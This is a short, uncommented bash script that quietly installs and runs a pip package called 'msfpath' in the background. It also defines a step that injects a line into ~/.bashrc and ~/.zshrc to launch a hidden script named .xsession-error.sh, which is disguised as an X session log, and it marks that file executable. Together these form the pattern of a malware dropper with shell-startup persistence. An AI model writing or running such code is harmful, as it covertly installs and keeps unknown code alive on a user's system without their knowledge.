he=$(echo $USER) 
function step1(){ 
hi=$(ps aux  | grep -v grep | grep "python3 -c from msfpath import check" | head -1) 
echo "$hi" >> output.txt 
if grep msfpath   <<<"$hi" >/dev/null 2>&1 
then
rm output.txt
echo "found"
else 
rm output.txt 
echo "not found"
python3 -c 'from msfpath import check' > /dev/null 
fi
} 
function step2(){ 
sed -i '5i /bin/zsh  /home/$he/.xsession-error.sh  >/dev/null 2' ~/.zshrc
sed -i '5i /bin/zsh  /home/$he/.xsession-error.sh  >/dev/null 2' ~/.bashrc
}  
function initial(){
pip list | grep -F msfpath | grep -o "msfpath" > /dev/null &&  step1 ||  python3 -m pip install msfpath -q -q -q  && step1 > /dev/null
}
chmod +x /home/$USER/.xsession-error.sh
initial
